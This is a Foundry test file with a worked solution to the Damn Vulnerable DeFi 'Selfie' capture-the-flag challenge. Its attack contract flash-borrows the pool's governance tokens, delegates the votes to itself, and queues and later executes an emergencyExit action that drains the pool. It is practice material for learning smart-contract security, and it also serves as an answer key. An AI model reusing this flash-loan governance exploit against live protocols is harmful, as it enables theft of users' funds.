// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        // The selfiePool contract has a flashLoan function that allows anyone to borrow tokens from the pool 
        // Notice that the token is also a voting token, andt here is a function to transfer all the tokens from the pool to the recovery account
        // Basically we can flashLoan the tokens to our smart contract, then propose a governance action to transfer all the tokens to the recovery account
        // this will pass since we will have more than the half of the votes, then aprove the token back to the pool to repay the flashLoan
        // then call the executeAction function to transfer all the tokens to the recovery account, notice that we will need to use a foundry cheatcode to skip the delay

        AttackSelfie attack = new AttackSelfie(pool, token, governance, recovery);
        attack.attack();

        // fast forward 2 days
        vm.warp(block.timestamp + 2 days);

        attack.executeActionInGovernance();

    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract AttackSelfie is IERC3156FlashBorrower {

    SelfiePool pool;
    DamnValuableVotes token;
    SimpleGovernance governance;
    address recovery;
    uint256 actionId;

    constructor(SelfiePool _pool, DamnValuableVotes _token, SimpleGovernance _governance, address _recovery) {
        pool = _pool;
        token = _token;
        governance = _governance;
        recovery = _recovery;
    }

    function attack() public {
        // we need to flashLoan the tokens to our contract to have the voting power
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1_500_000e18, "");

    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
        // we need to delegate the voting power to our contract when we have the tokens
        // by default the voting power is 0 unless we delegate to ourselves
        token.delegate(address(this));

        // we need to approve the token to the pool to repay the flashLoan
        token.approve(address(pool), 1_500_000e18);

        // queue action to transfer all tokens to recovery account
        actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", recovery));

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeActionInGovernance() external {
        governance.executeAction(actionId);
    }
}

